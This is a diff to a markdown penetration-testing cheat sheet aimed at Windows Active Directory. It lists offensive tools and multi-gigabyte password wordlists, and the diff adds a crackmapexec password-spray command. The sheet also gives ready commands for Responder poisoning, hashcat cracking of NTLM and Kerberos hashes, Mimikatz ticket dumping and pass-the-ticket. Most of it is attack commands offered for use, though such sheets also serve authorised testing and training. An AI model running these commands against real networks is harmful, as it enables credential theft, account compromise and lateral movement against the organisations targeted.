@@ -2,7 +2,6 @@
 How to pentest like a Gunnaj
 
 ## Tools bby
-
 ### linWinPwn - Active Directory Vulnerability Scanner
 https://github.com/lefayjey/linWinPwn
 ### BloodHound
@@ -25,16 +24,13 @@ https://github.com/danielmiessler/SecLists/blob/master/Passwords/Common-Credenti
 ### Crackstation
 https://crackstation.net/files/crackstation.txt.gz (14.6 GB)
 
-
 ### Large p-list
 https://download.g0tmi1k.com/wordlists/large/36.4GB-18_in_1.lst.7z (48.4 GB)
 
 ### Rockyou2021
-
 https://github.com/ohmybahgosh/RockYou2021.txt (91.6 GB)
 
 # VEV
-
 ## Nmap
 #### Ping scan
 ```bash
@@ -67,7 +63,11 @@ nslookup -type=SRV _ldap._tcp.dc._msdcs.<AD_domain>
 ```bash
 sudo ./linWinPwn.sh -t <Domain_Controller_IP> -u <AD_user> -p <AD_password> -o <output_dir>
 ```
-
+## Password spray
+### Spray a password on a user list
+```bash
+crackmapexec smb <Domain_Controller_IP> -u users.txt -p <password> --continue-on-success
+```
 ## Responder
 ### Kickstart responder
 ```bash
@@ -125,10 +125,12 @@ SNMP = Off
 ```bash
 sudo mount.cifs <//ip/folder> <./folder> -o user=<username>,password=<password>,dom=<domain.com>
 ```
+
 ### Unmount share
 ```bash
 sudo umount <./folder>
 ```
+
 ### Search for keywords in files
 ```bash
 grep -i <keyword> *
@@ -148,10 +150,12 @@ pret.py target {ps,pjl,pcl}
 ```bash
 hashcat64.exe -m 5600 ntlm-hashes.txt <passlist.txt> -o cracked.txt
 ```
+
 ### Crack kerberos hashes
 ```bash
 hashcat64.exe -m 13100 krb5tgs-hashes.txt <passlist.txt> -o cracked.txt
 ```
+
 ## Mimikatz
 ### Dump tickets
 ```bash
@@ -159,6 +163,7 @@ mimikatz.exe
 privilege::debug
 sekurlsa::tickets /export
 ```
+
 ### Pass the ticket
 ```bash
 mimikatz.exe
